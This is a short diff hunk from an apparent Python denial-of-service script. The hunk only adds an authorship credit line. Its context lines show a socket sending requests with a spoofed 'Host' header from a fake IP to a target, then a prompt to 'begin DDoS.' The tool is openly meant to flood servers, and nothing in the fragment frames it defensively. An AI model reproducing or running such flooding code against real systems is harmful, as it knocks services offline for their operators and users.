@@ -27,7 +27,7 @@ def request():
         sock.sendto(("Host: " + myFakeIP + "\r\n\r\n").encode('ascii'), (target, port))
         sock.close()
 
-
+print("Made by SpiritD3v.")
 print(colorama.Back.BLACK+colorama.Fore.GREEN+"Press ENTER to begin DDoS.")
 input(colorama.Back.BLACK+colorama.Fore.GREEN+"")
 
